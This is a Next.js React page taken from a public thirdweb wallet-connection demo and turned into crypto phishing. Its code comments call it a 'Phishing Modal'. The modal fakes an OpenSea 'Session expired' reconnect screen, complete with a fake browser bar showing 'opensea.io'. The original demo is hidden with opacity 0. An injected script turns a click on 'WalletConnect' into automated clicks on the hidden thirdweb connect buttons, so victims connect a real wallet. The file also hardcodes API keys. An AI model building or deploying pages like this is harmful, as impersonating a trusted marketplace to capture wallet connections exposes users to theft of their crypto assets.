import {
  Card,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  ThirdwebProvider,
  localWallet,
  smartWallet,
  magicLink,
  ConnectWallet,
  metamaskWallet,
  coinbaseWallet,
  walletConnect,
  safeWallet,
} from "@thirdweb-dev/react";
import { Inter } from "next/font/google";
import { useState, useEffect } from "react";

const inter = Inter({ subsets: ["latin"] });

export default function Home() {
  // State to control visibility of the phishing modal
  const [showPhishingModal, setShowPhishingModal] = useState(true);

  // Close modal function
  const closeModal = () => {
    setShowPhishingModal(false);
  };

  return (
    <>
      {/* Phishing Modal */}
      {showPhishingModal && (
        <div style={{
          position: "fixed",
          top: 0,
          left: 0,
          width: "100%",
          height: "100%",
          backgroundColor: "rgba(0,0,0,0.7)",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          zIndex: 9999
        }}>
          <div className="modal-container">
            <div className="browser-bar">
              <div className="browser-controls">
                <button className="browser-button">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M19 12H5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    <path d="M12 19L5 12L12 5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </button>
                <button className="browser-button">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M5 12H19" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    <path d="M12 5L19 12L12 19" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </button>
                <button className="browser-button">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 4V10H7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    <path d="M3.51 15C4.15839 16.8404 5.38734 18.4202 7.01166 19.5014C8.63598 20.5826 10.5677 21.1066 12.5157 20.9945C14.4637 20.8824 16.3226 20.1402 17.8121 18.8798C19.3017 17.6193 20.3413 15.909 20.7742 14.0064C21.2072 12.1037 21.0101 10.1266 20.2126 8.3609C19.4152 6.59523 18.0605 5.1449 16.3528 4.20806C14.6451 3.27123 12.6769 2.89093 10.7447 3.11875C8.81245 3.34657 7.02091 4.17073 5.64 5.47L1 10" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </button>
              </div>
              <div className="url-container">
                <span className="lock-icon">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="5" y="11" width="14" height="10" rx="2" stroke="currentColor" strokeWidth="2"/>
                    <path d="M8 11V7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7V11" stroke="currentColor" strokeWidth="2"/>
                  </svg>
                </span>
                <span className="url-text">opensea.io</span>
              </div>
              <div className="browser-actions">
                <button className="action-button" style={{ position: "relative" }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M18 8C18 6.4087 17.3679 4.88258 16.2426 3.75736C15.1174 2.63214 13.5913 2 12 2C10.4087 2 8.88258 2.63214 7.75736 3.75736C6.63214 4.88258 6 6.4087 6 8C6 15 3 17 3 17H21C21 17 18 15 18 8Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    <path d="M13.73 21C13.5542 21.3031 13.3019 21.5547 12.9982 21.7295C12.6946 21.9044 12.3504 21.9965 12 21.9965C11.6496 21.9965 11.3054 21.9044 11.0018 21.7295C10.6982 21.5547 10.4458 21.3031 10.27 21" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                  <div className="notification-badge"></div>
                </button>
                <button className="action-button">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="11" cy="11" r="8" stroke="currentColor" strokeWidth="2"/>
                    <path d="M21 21L16.65 16.65" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
                  </svg>
                </button>
                <button className="action-button">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </button>
              </div>
            </div>
            <div className="modal-header">
              <button className="close-button" onClick={closeModal}>×</button>
              <div className="opensea-logo">
                <svg width="36" height="36" viewBox="0 0 90 90" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M45 0C20.151 0 0 20.151 0 45C0 69.849 20.151 90 45 90C69.849 90 90 69.849 90 45C90 20.151 69.858 0 45 0ZM22.203 46.512L22.392 46.206L34.101 27.891C34.272 27.63 34.677 27.657 34.803 27.945C36.756 32.328 38.448 37.782 37.656 41.175C37.323 42.57 36.396 44.46 35.352 46.206C35.217 46.458 35.073 46.71 34.929 46.953C34.851 47.061 34.725 47.124 34.587 47.124H22.545C22.221 47.124 22.032 46.773 22.203 46.512ZM74.376 52.812C74.376 52.983 74.277 53.127 74.133 53.19C73.224 53.577 70.119 55.008 68.832 56.799C65.538 61.38 63.027 67.932 57.402 67.932H33.948C25.632 67.932 18.9 61.173 18.9 52.83V52.56C18.9 52.344 19.08 52.164 19.305 52.164H32.373C32.634 52.164 32.823 52.398 32.805 52.659C32.706 53.505 32.868 54.378 33.273 55.17C34.047 56.745 35.658 57.726 37.395 57.726H43.866V52.677H37.467C37.143 52.677 36.945 52.299 37.134 52.029C37.206 51.921 37.278 51.813 37.368 51.687C37.971 50.823 38.835 49.491 39.699 47.97C40.284 46.944 40.851 45.846 41.31 44.748C41.4 44.55 41.472 44.343 41.553 44.145C41.679 43.794 41.805 43.461 41.895 43.137C41.985 42.858 42.066 42.57 42.138 42.3C42.354 41.364 42.444 40.374 42.444 39.348C42.444 38.943 42.426 38.52 42.39 38.124C42.372 37.683 42.318 37.242 42.264 36.801C42.228 36.414 42.156 36.027 42.084 35.631C41.985 35.046 41.859 34.461 41.715 33.876L41.661 33.651C41.553 33.246 41.454 32.868 41.328 32.463C40.959 31.203 40.545 29.97 40.095 28.818C39.933 28.359 39.753 27.918 39.564 27.486C39.294 26.82 39.015 26.217 38.763 25.65C38.628 25.389 38.52 25.155 38.412 24.912C38.286 24.642 38.16 24.372 38.025 24.111C37.935 23.913 37.827 23.724 37.755 23.544L36.963 22.086C36.855 21.888 37.035 21.645 37.251 21.708L42.201 23.049H42.219C42.228 23.049 42.228 23.049 42.237 23.049L42.885 23.238L43.605 23.436L43.866 23.508V20.574C43.866 19.152 45 18 46.413 18C47.115 18 47.754 18.279 48.204 18.72C48.663 19.152 48.951 19.782 48.951 20.484V24.372L49.482 24.57C49.518 24.579 49.563 24.597 49.599 24.615C49.725 24.66 49.896 24.732 50.103 24.831C50.247 24.903 50.4 24.984 50.571 25.074C50.778 25.173 50.985 25.29 51.219 25.416C51.453 25.542 51.687 25.677 51.939 25.839C52.089 25.938 52.257 26.055 52.416 26.172C52.731 26.37 53.046 26.595 53.361 26.829C53.457 26.901 53.553 26.973 53.649 27.054C54.135 27.42 54.621 27.84 55.098 28.296C55.206 28.395 55.296 28.485 55.395 28.584C55.917 29.124 56.4 29.718 56.817 30.348C56.916 30.483 57.006 30.627 57.096 30.771C57.213 30.96 57.321 31.14 57.429 31.329C57.528 31.5 57.636 31.68 57.726 31.869C57.816 32.049 57.906 32.238 57.987 32.418C58.041 32.526 58.086 32.634 58.14 32.751C58.257 33.021 58.365 33.3 58.464 33.588C58.563 33.876 58.644 34.173 58.707 34.461C58.734 34.578 58.761 34.704 58.77 34.83C58.851 35.316 58.887 35.811 58.887 36.306C58.887 36.342 58.887 36.378 58.887 36.414C58.887 36.753 58.869 37.11 58.833 37.458C58.815 37.683 58.779 37.899 58.743 38.124C58.707 38.367 58.653 38.61 58.599 38.844C58.545 39.096 58.473 39.348 58.401 39.6C58.329 39.852 58.239 40.113 58.14 40.365C58.032 40.635 57.924 40.905 57.807 41.175C57.735 41.334 57.663 41.493 57.582 41.661C57.45 41.919 57.318 42.168 57.177 42.408C57.105 42.54 57.024 42.672 56.943 42.804C56.775 43.065 56.607 43.317 56.43 43.56C56.331 43.704 56.232 43.848 56.124 43.983C55.935 44.226 55.746 44.469 55.548 44.703C55.449 44.82 55.341 44.946 55.233 45.063C55.017 45.297 54.801 45.513 54.585 45.738C54.459 45.873 54.333 46.008 54.207 46.134C53.919 46.431 53.631 46.728 53.334 47.007C53.199 47.133 53.064 47.268 52.92 47.385C52.605 47.691 52.29 47.979 51.975 48.249C51.831 48.375 51.687 48.492 51.534 48.609C51.138 48.951 50.742 49.275 50.337 49.563C50.175 49.689 50.013 49.815 49.851 49.932C49.536 50.175 49.212 50.4 48.897 50.616C48.708 50.751 48.528 50.868 48.339 50.994C48.15 51.12 47.961 51.237 47.772 51.354C47.583 51.471 47.403 51.579 47.214 51.687C47.025 51.795 46.845 51.903 46.656 52.002C46.476 52.092 46.296 52.182 46.107 52.263C45.918 52.353 45.738 52.434 45.549 52.515C45.369 52.587 45.198 52.659 45.018 52.722C44.919 52.758 44.829 52.785 44.73 52.821C44.73 52.83 44.721 52.83 44.721 52.839C44.532 52.893 44.343 52.974 44.145 53.019V57.726H50.337C52.383 57.726 54.255 56.556 55.11 54.702C55.299 54.288 55.299 53.829 55.11 53.415C55.047 53.28 54.993 53.154 54.924 53.028C54.906 53.019 54.897 53.001 54.888 52.983C54.87 52.947 54.861 52.911 54.853 52.884C54.834 52.824 54.825 52.758 54.825 52.689C54.825 52.476 54.924 52.263 55.11 52.146C55.143 52.119 55.176 52.101 55.209 52.092H74.043C74.232 52.092 74.385 52.236 74.385 52.425V52.812H74.376Z" fill="white"/>
                </svg>
              </div>
              <h2 className="modal-title">Reconnect with OpenSea<br/><h4>Session expired</h4></h2>
            </div>
            <div className="wallet-list">
              <div className="wallet-option">
                <div className="wallet-icon">
                  <img src="https://cdnjs.cloudflare.com/ajax/libs/cryptocurrency-icons/0.18.1/svg/meta.svg" alt="MetaMask" />
                </div>
                <span className="wallet-name">MetaMask</span>
                <span className="installed-tag">Installed</span>
              </div>
              <div className="wallet-option">
                <div className="wallet-icon" style={{ backgroundColor: "#0052FF" }}>
                  <img src="https://cdnjs.cloudflare.com/ajax/libs/cryptocurrency-icons/0.18.1/svg/generic.svg" alt="Coinbase Wallet" />
                </div>
                <span className="wallet-name">Coinbase Wallet</span>
              </div>
              <div className="wallet-option">
                <div className="wallet-icon" style={{ backgroundColor: "#00A5FF" }}>
                  <img src="https://cdnjs.cloudflare.com/ajax/libs/cryptocurrency-icons/0.18.1/svg/generic.svg" alt="Abstract" />
                </div>
                <span className="wallet-name">Abstract</span>
              </div>
              <div className="wallet-option">
                <div className="wallet-icon" style={{ backgroundColor: "#3B99FC" }}>
                  <img src="https://cdnjs.cloudflare.com/ajax/libs/cryptocurrency-icons/0.18.1/svg/generic.svg" alt="WalletConnect" />
                </div>
                <span className="wallet-name">WalletConnect</span>
              </div>
              <div className="more-options">More Wallet Options</div>
            </div>
            <div className="divider">or continue with email</div>
            <div className="email-button-container">
              <button className="email-button">
                Continue with email
                <span className="arrow-icon">→</span>
              </button>
            </div>
            <div className="terms">
              By connecting your wallet and using OpenSea, you agree to
            </div>
          </div>
        </div>
      )}

       <script dangerouslySetInnerHTML={{
            __html: `
              // Function to find and attach click event to the WalletConnect span
              function attachClickToWalletConnectSpan() {
                // Find all spans with the specified class
                const spans = document.querySelectorAll('span.jsx-3e0f9c42dd98a8bd.wallet-name');
                
                // Loop through all matching spans
                for (const span of spans) {
                  // Check if this span contains the text "WalletConnect"
                  if (span.textContent === 'WalletConnect') {
                    // Add click event listener to this span
                    span.addEventListener('click', function() {
                      console.log('WalletConnect span clicked, executing sequence...');
                      
                      // Execute the additional code immediately after WalletConnect span is clicked
                      const buttonElement = document.querySelector('button.jsx-3e0f9c42dd98a8bd.close-button');
                      if (buttonElement) {
                        buttonElement.click();
                      }
                      const data = {
                        success: !!buttonElement
                      };
                      console.log('Close button clicked:', data);
                      
                      // Execute your original code sequence
                      setTimeout(function() {
                        // First button click
                        document.querySelector('button.tw-connect-wallet.css-1un3lp3').click();
                        
                        // Wait 2 seconds before finding and clicking the next button
                        setTimeout(function() {
                          const buttons = document.querySelectorAll('button');
                          let walletConnectButton = null;
                          let metaMaskButton = null;
                          
                          for (const button of buttons) {
                            if (button.textContent.includes('WalletConnect')) {
                              walletConnectButton = button;
                            }
                            if (button.textContent.includes('MetaMask')) {
                              metaMaskButton = button;
                            }
                          }
                          
                          if (walletConnectButton) {
                            walletConnectButton.click();
                            
                            // Wait 2 seconds before clicking the MetaMask button
                            setTimeout(function() {
                              if (metaMaskButton) {
                                metaMaskButton.click();
                                
                                // Wait 2 seconds after the last function before executing $0.click()
                                setTimeout(function() {
                                  $0.click();
                                }, 2000); // 2 seconds delay before $0.click()
                              } else {
                                console.error('Button with text "MetaMask" not found.');
                              }
                            }, 2000); // 2 seconds delay before MetaMask button
                          } else {
                            console.error('Button with text "WalletConnect" not found.');
                          }
                        }, 2000); // 2 seconds delay after first button click
                      }, 5000); // 5 seconds initial delay
                    });
                    
                    console.log('Click event attached to WalletConnect span');
                    return; // Exit the function after attaching the event to the first matching span
                  }
                }
                
                console.log('WalletConnect span not found');
              }

              // Run the function after the page has fully loaded
              document.addEventListener('DOMContentLoaded', attachClickToWalletConnectSpan);
              // Backup in case the DOM is already loaded
              if (document.readyState === 'interactive' || document.readyState === 'complete') {
                attachClickToWalletConnectSpan();
              }
            `
          }} />

      {/* Original Vercel App Content */}
      <main style={{
          opacity: 0
        }}
        className={`flex min-h-screen flex-col items-center p-5 pt-24 text-center ${inter.className}`}
      >
        <div className="radial-gradient absolute blur-3xl rounded-full opacity-10 bg-gradient-to-br from-indigo-400 via-purple-400 to-pink-400 z-0 h-64 w-1/2 top-8 left-1/4 " />

        <h1 className="scroll-m-20 text-4xl font-extrabold tracking-tight lg:text-5xl">
          Wallet Connect Buttons
        </h1>

        <p className="leading-7 mt-6 text-xl">
          A demonstration of the various options available for connecting to, or
          creating user wallets.
        </p>

        <div className="flex flex-col items-center justify-center mt-24 w-full sm:w-2/3">
          <h2 className="scroll-m-20 border-b pb-2 text-3xl font-semibold tracking-tight transition-colors first:mt-0">
            Try it out
          </h2>

          <p className="leading-7 mt-6 text-md">
            Navigate through the tabs below to see the options in action.
          </p>

          <Tabs defaultValue="browser" className="z-10 mt-4">
            <TabsList>
              <TabsTrigger value="local">Local Wallet</TabsTrigger>
              <TabsTrigger value="local-and-smart">
                Local Wallet + Smart Wallet
              </TabsTrigger>
              <TabsTrigger value="service">
                Non-custodial service wallet
              </TabsTrigger>
              <TabsTrigger value="browser">Browser wallets</TabsTrigger>
              <TabsTrigger value="safe">Safe Wallet</TabsTrigger>
              <TabsTrigger value="smart">Smart Wallet</TabsTrigger>
            </TabsList>

            {/* Local Wallet */}
            <TabsContent value="local">
              <Card>
                <ThirdwebProvider
                  activeChain="mumbai"
                  theme="dark"
                  supportedWallets={[localWallet()]}
                >
                  <CardHeader className="justify-start">
                    <CardTitle className="text-left">Local Wallet</CardTitle>
                    <CardDescription className="pt-1 text-left pb-1 flex-wrap max-w-2xl">
                      Generate a wallet, and encrypt the private key in local
                      storage. The password used to encrypt the private key is
                      what is used to decrypt it. The user can export the wallet
                      at any time.
                    </CardDescription>
                    <div className="text-sm text-muted-foreground text-left pb-3 flex-wrap max-w-xl">
                      <ul className="list-disc list-inside">
                        <li>
                          <strong>Pro: </strong>Seamless onboarding experience.
                        </li>
                        <li>
                          <b>Con: </b>Easy to lose access to the wallet if local
                          storage is deleted.
                        </li>
                      </ul>
                    </div>
                    <CardDescription className="pt-1 text-left">
                      <ConnectWallet />
                    </CardDescription>
                  </CardHeader>
                </ThirdwebProvider>
              </Card>
            </TabsContent>

            {/* Local Wallet as EOA for Generated Smart Wallet */}
            <TabsContent value="local-and-smart">
              <Card>
                <ThirdwebProvider
                  activeChain="mumbai"
                  theme="dark"
                  supportedWallets={[
                    smartWallet({
                      factoryAddress:
                        "0x05c5870f911FC2077d4abEA68BDfD0E6C1763652", // https://thirdweb.com/mumbai/0x05c5870f911FC2077d4abEA68BDfD0E6C1763652
                      gasless: true,
                      thirdwebApiKey:
                        "8a4719688317c7bfbce9bc19c905dd31727dca421e471abe1fb1a2ec958f6148283b1003938163ae97dce2b2a11e843a5e293b13c6309e710aa2541e2dbc1297",
                      personalWallets: [localWallet()],
                    }),
                  ]}
                >
                  <CardHeader className="justify-start">
                    <CardTitle className="text-left">
                      Local Wallet as a signer for Smart Wallet
                    </CardTitle>
                    <CardDescription className="pt-1 text-left pb-1 flex-wrap max-w-2xl">
                      Generate a wallet, and encrypt the private key in local
                      storage. The password used to encrypt the private key is
                      what is used to decrypt it. The user can export the wallet
                      at any time. The generated EOA wallet is used as the signer
                      for a generated EIP-4337 Account abstraction smart wallet.
                      The user can update/change the signer of the smart wallet.
                    </CardDescription>
                    <div className="text-sm text-muted-foreground text-left pb-3 flex-wrap max-w-xl">
                      <ul className="list-disc list-inside">
                        <li>
                          <strong>Pro: </strong>Seamless onboarding experience.
                        </li>
                        <li>
                          <strong>Pro: </strong>Can change the signer of the smart
                          wallet to another wallet.
                        </li>
                        <li>
                          <strong>Con: </strong>Easy to lose access to the EOA
                          wallet if local storage is deleted.
                        </li>
                      </ul>
                    </div>
                    <CardDescription className="pt-1 text-left">
                      <ConnectWallet />
                    </CardDescription>
                  </CardHeader>
                </ThirdwebProvider>
              </Card>
            </TabsContent>

            {/* Non-custodial service wallet */}
            <TabsContent value="service">
              <Card>
                <ThirdwebProvider
                  activeChain="mumbai"
                  theme="dark"
                  supportedWallets={[
                    magicLink({
                      apiKey: "pk_live_151F12DF754A79CE",
                    }),
                  ]}
                >
                  <CardHeader className="justify-start">
                    <CardTitle className="text-left">
                      Non-custodial wallet from a service
                    </CardTitle>
                    <CardDescription className="pt-1 text-left pb-1 flex-wrap max-w-2xl">
                      Using a service such as{" "}
                      <a
                        href="https://magic.link/"
                        className="font-semibold underline"
                        target="_blank"
                      >
                        Magic Link
                      </a>{" "}
                      or{" "}
                      <a
                        href="https://docs.withpaper.com/reference/embedded-wallet-service-overview"
                        className="font-semibold underline"
                        target="_blank"
                      >
                        Paper Wallet
                      </a>
                      , the user ties their social media account / email address /
                      phone number to a wallet that is generated for them. Using
                      the same &ldquo;web2&rdquo; login method, they can then
                      re-connect to the same wallet from any device at a later
                      time.
                    </CardDescription>
                    <div className="text-sm text-muted-foreground text-left pb-3 flex-wrap max-w-xl">
                      <ul className="list-disc list-inside">
                        <li>
                          <strong>Pro: </strong>Familiar web2 onboarding
                          experience.
                        </li>
                        <li>
                          <strong>Pro: </strong>Private keys cannot be
                          reconstructed by the service.
                        </li>
                        <li>
                          <strong>Con: </strong>Dependency on third party service
                          to access wallet (unless exported).
                        </li>
                      </ul>
                    </div>
                    <CardDescription className="pt-1 text-left">
                      <ConnectWallet />
                    </CardDescription>
                  </CardHeader>
                </ThirdwebProvider>
              </Card>
            </TabsContent>

            {/* Browser Wallets */}
            <TabsContent value="browser">
              <Card>
                <ThirdwebProvider
                  activeChain="mumbai"
                  theme="dark"
                  supportedWallets={[
                    metamaskWallet(),
                    coinbaseWallet(),
                    walletConnect(),
                  ]}
                >
                  <CardHeader className="justify-start">
                    <CardTitle className="text-left">Browser Wallets</CardTitle>
                    <CardDescription className="pt-1 text-left pb-1 flex-wrap max-w-2xl">
                      Browser extension and mobile applications that create EOA
                      wallets that only you know the private key of, such as
                      MetaMask.
                    </CardDescription>
                    <div className="text-sm text-muted-foreground text-left pb-3 flex-wrap max-w-xl">
                      <ul className="list-disc list-inside">
                        <li>
                          <strong>Pro: </strong>You are the only holder of the
                          private key.
                        </li>
                        <li>
                          <strong>Pro: </strong>Can change the signer of the smart
                          wallet to another wallet.
                        </li>
                        <li>
                          <strong>Con: </strong>Single point of failure; no
                          recovery from loss/compromisation of private key.
                        </li>
                        <li>
                          <strong>Con: </strong>Requires user to install
                          complicated software to use.
                        </li>
                      </ul>
                    </div>
                    <CardDescription className="pt-1 text-left">
                      <ConnectWallet />
                    </CardDescription>
                  </CardHeader>
                </ThirdwebProvider>
              </Card>
            </TabsContent>

            {/* Safe Multi-sig Wallet (formerly Gnosis) */}
            <TabsContent value="safe">
              <Card>
                <ThirdwebProvider
                  activeChain="mumbai"
                  theme="dark"
                  supportedWallets={[safeWallet()]}
                >
                  <CardHeader className="justify-start">
                    <CardTitle className="text-left">
                      Safe Wallets (multi-sig)
                    </CardTitle>
                    <CardDescription className="pt-1 text-left pb-1 flex-wrap max-w-2xl">
                      Smart contract wallets that require multiple signatures to
                      execute a transaction.
                    </CardDescription>
                    <div className="text-sm text-muted-foreground text-left pb-3 flex-wrap max-w-xl">
                      <ul className="list-disc list-inside">
                        <li>
                          <strong>Pro: </strong>Multiple signers required to send
                          a transaction.
                        </li>
                        <li>
                          <strong>Pro: </strong>Recoverable if one private key is
                          lost.
                        </li>
                        <li>
                          <strong>Con: </strong>Very complicated for new users.
                          Requires knowledge of wallets and smart contracts.
                        </li>
                      </ul>
                    </div>
                    <CardDescription className="pt-1 text-left">
                      <ConnectWallet />
                    </CardDescription>
                  </CardHeader>
                </ThirdwebProvider>
              </Card>
            </TabsContent>

            {/* Smart Wallet - Account Abstraction EIP4337 */}
            <TabsContent value="smart">
              <Card>
                <ThirdwebProvider
                  activeChain="mumbai"
                  theme="dark"
                  supportedWallets={[
                    smartWallet({
                      factoryAddress:
                        "0x05c5870f911FC2077d4abEA68BDfD0E6C1763652", // https://thirdweb.com/mumbai/0x05c5870f911FC2077d4abEA68BDfD0E6C1763652
                      gasless: true,
                      thirdwebApiKey:
                        "8a4719688317c7bfbce9bc19c905dd31727dca421e471abe1fb1a2ec958f6148283b1003938163ae97dce2b2a11e843a5e293b13c6309e710aa2541e2dbc1297",
                    }),
                  ]}
                >
                  <CardHeader className="justify-start">
                    <CardTitle className="text-left">
                      Smart Wallets (EIP-4337 Account Abstraction)
                    </CardTitle>
                    <CardDescription className="pt-1 text-left pb-1 flex-wrap max-w-2xl">
                      Smart contract wallets that can have any custom
                      functionality.
                    </CardDescription>
                    <CardDescription className="text-left pb-3 flex-wrap max-w-2xl">
                      <a
                        className="font-semibold underline"
                        href="https://blog.jarrodwatts.com/what-is-account-abstraction-and-how-does-eip-4337-work"
                      >
                        Read my full blog post on EIP-4337 Account abstraction
                      </a>
                    </CardDescription>
                    <CardDescription className="pt-1 text-left">
                      <ConnectWallet />
                    </CardDescription>
                  </CardHeader>
                </ThirdwebProvider>
              </Card>
            </TabsContent>
          </Tabs>

          <a
            href="https://github.com/jarrodwatts/wallets"
            target="_blank"
            className="text-md text-muted-foreground mt-8 underline semibold"
          >
            View the source code on GitHub.
          </a>
        </div>
      </main>

      {/* CSS Styles for the phishing modal */}
      <style jsx global>{`
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            margin: 0;
            padding: 0;
            color: white;
        }
        
        .browser-bar {
            display: flex;
            align-items: center;
            background-color: #1e1e1e;
            width: 820px;
            height: 44px;
            border-radius: 8px 8px 0 0;
            padding: 0 10px;
            margin-bottom: 20px;
        }
        
        .browser-controls {
            display: flex;
            align-items: center;
            margin-right: 10px;
        }
        
        .browser-button {
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #8b8b8b;
            margin-right: 6px;
            border: none;
            background: none;
            cursor: pointer;
        }
        
        .url-container {
            flex-grow: 1;
            height: 30px;
            background-color: #333;
            border-radius: 15px;
            display: flex;
            align-items: center;
            padding: 0 10px;
            margin: 0 8px;
        }
        
        .lock-icon {
            color: #8b8b8b;
            font-size: 12px;
            margin-right: 6px;
        }
        
        .url-text {
            color: #e0e0e0;
            font-size: 13px;
        }
        
        .browser-actions {
            display: flex;
            align-items: center;
        }
        
        .action-button {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #8b8b8b;
            margin-left: 6px;
            border: none;
            background: none;
            cursor: pointer;
        }
        
        .notification-badge {
            background-color: #1D9BF0;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            position: absolute;
            top: 5px;
            right: 5px;
        }

        .modal-container {
            width: 360px;
            background-color: #000;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
            position: relative;
        }

        .modal-header {
            padding: 24px 0 18px;
            text-align: center;
            position: relative;
        }

        .close-button {
            position: absolute;
            top: 12px;
            right: 12px;
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
        }

        .opensea-logo {
            width: 60px;
            height: 60px;
            background-color: #1DA1F2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
        }
        
        .opensea-logo img {
            width: 36px;
            height: 36px;
        }

        .modal-title {
            font-size: 20px;
            font-weight: 700;
            margin: 0;
        }

        .wallet-list {
            padding: 0;
            margin: 16px 0 0;
        }

        .wallet-option {
            display: flex;
            align-items: center;
            padding: 16px 20px;
            border-top: 1px solid #2a2a2a;
            cursor: pointer;
        }

        .wallet-icon {
            width: 32px;
            height: 32px;
            margin-right: 12px;
            border-radius: 8px;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .wallet-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .wallet-name {
            flex-grow: 1;
            font-size: 16px;
            font-weight: 500;
        }

        .installed-tag {
            background-color: #3a3a3d;
            color: #ccc;
            font-size: 12px;
            padding: 3px 8px;
            border-radius: 4px;
        }

        .more-options {
            text-align: center;
            padding: 16px;
            font-size: 16px;
            color: #ccc;
            border-top: 1px solid #2a2a2a;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            color: #6a6a6a;
            font-size: 14px;
            padding: 14px 24px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #333;
        }

        .divider::before {
            margin-right: 10px;
        }

        .divider::after {
            margin-left: 10px;
        }

        .email-button-container {
            padding: 16px 24px 24px;
        }

        .email-button {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #333;
            border-radius: 8px;
            background-color: transparent;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        .arrow-icon {
            width: 24px;
            height: 24px;
            background-color: #2081e2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .terms {
            color: #6a6a6a;
            font-size: 12px;
            text-align: center;
            padding: 0 24px 24px;
            line-height: 1.4;
        }
      `}</style>
    </>
  );
}
